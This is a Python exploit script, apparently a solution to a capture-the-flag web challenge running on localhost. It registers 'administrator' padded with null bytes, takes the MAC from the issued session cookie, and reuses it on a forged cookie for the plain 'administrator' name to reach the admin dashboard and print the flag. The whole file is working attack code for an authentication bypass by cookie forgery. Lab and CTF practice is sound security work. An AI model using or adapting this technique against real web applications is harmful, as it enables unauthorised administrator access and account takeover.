#!/usr/bin/env python3
import requests
import sys

TARGET_URL = "http://localhost:1337"
REGISTER_URL = f"{TARGET_URL}/register"
LOGIN_URL = f"{TARGET_URL}/login"
DASHBOARD_URL = f"{TARGET_URL}/dashboard"

# Target baru: administrator (13 bytes)
# Padding: 16 - 13 = 3 bytes
# Register: "administrator" + "\x00"*3
def exploit():
    s = requests.Session()
    
    # "administrator" (13 chars) + 3 null bytes = 16 chars
    fake_user_bytes = b"administrator" + (b"\x00" * 3)
    fake_user_str = fake_user_bytes.decode('latin-1')
    password = "password123"

    print(f"[*] Trying to register: {fake_user_bytes}")
    s.post(REGISTER_URL, data={"username": fake_user_str, "password": password})
    s.post(LOGIN_URL, data={"username": fake_user_str, "password": password})
    
    if not s.cookies:
        print("[-] Login failed.")
        return

    cookie_name = list(s.cookies.keys())[0]
    full_cookie = s.cookies[cookie_name]
    print(f"[+] Got Cookie: {full_cookie}")
    
    try:
        _, mac_hex = full_cookie.split('%7C')
    except:
        _, mac_hex = full_cookie.split('|')

    # Forge: administrator (tanpa null byte)
    # Server bakal nambah padding 3 byte null -> Cocok sama MAC kita!
    admin_hex = b"administrator".hex()
    forged_cookie = f"{admin_hex}|{mac_hex}"
    
    print(f"[*] Accessing as 'administrator'...")
    r = requests.get(DASHBOARD_URL, cookies={cookie_name: forged_cookie})
    
    if "pwn{" in r.text:
        print("\n[+] PWNED! Flag Found:")
        for line in r.text.splitlines():
            if "pwn{" in line:
                print(line.strip())
    else:
        print("[-] Gagal (Check HTML output manual).")
        # Print Flag line if format is different
        import re
        if "Welcome," in r.text:
             print(re.search(r"Welcome, (.*?)(\.|\!)", r.text).group(0))
        # Print baris yang mencurigakan (panjang > 20 char)
        for line in r.text.splitlines():
            if "flag" in line.lower() or "{" in line:
                print(f"Possible Flag: {line.strip()}")

if __name__ == "__main__":
    exploit()
